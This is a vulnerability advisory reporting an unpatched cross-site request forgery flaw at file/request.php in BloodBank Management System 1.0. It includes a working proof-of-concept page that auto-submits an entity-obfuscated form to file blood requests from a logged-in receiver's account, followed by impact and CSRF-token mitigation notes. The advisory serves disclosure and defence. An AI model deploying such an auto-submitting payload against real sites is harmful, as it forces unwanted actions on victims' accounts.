
## **Affected Version:**
- **BloodBank Management System**: 1.0

## **Vulnerability Information:**
- **Vulnerability Type:** Cross Site Request Forgery (CSRF)
- **Severity:** HIGH
- **Status:** Unpatched

## **Vulnerable Endpoint:**
- **Path:** `file/request.php`

## **Vulnerability Description:**
There is a Cross Site Request Forgery on this endpoint `/file/request.php` which allows a remote user to initiate a `blood sample` request on the account of a `receiver` who is logged in, from the available blood sample of a selected hospital

Successful exploitation can lead to **unauthorized actions** on behalf of the victim. Additionally, this could be exploited by visiting malicious websites with the payload.

---

## **Proof of Concept (PoC):**

Below is an example of a **CSRF POC Attack** that initiates a `blood sample` request from a logged in `receiver's` account:

```html

<html>
    <head>
        <title>CSRF PoC</title>
    </head>
    <body>
        <form action="http://&#108;&#111;&#99;&#97;&#108;&#104;&#111;&#115;&#116;&#46;&#108;&#111;&#99;&#97;&#108;&#47;&#98;&#108;&#111;&#111;&#100;&#98;&#97;&#110;&#107;&#47;&#102;&#105;&#108;&#101;&#47;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#112;&#104;&#112;" method="POST" enctype="application/x-www-form-urlencoded">
            <input name="&#98;&#105;&#100;" value="&#49;&#54;">
            <input name="&#104;&#105;&#100;" value="&#51;">
            <input name="&#98;&#103;" value="&#66;&#45;">
            <input name="&#114;&#101;&#113;&#117;&#101;&#115;&#116;" value="&#82;&#101;&#113;&#117;&#101;&#115;&#116;&#43;&#83;&#97;&#109;&#112;&#108;&#101;">
        </form>
        <script>
            document.querySelector("form").submit();
        </script>
    </body>
</html>





```

---



## **Impact:**
- **Data Manipulation:** Attackers could modify the content displayed to users.
- **Reputational Damage:** Users may lose trust in the system due to malicious behavior.

---

## **Mitigation Recommendations:**
1. **Use CSRF Token** Implement mechanism to deter cross domain access or put `csrf tokens` in your request

---
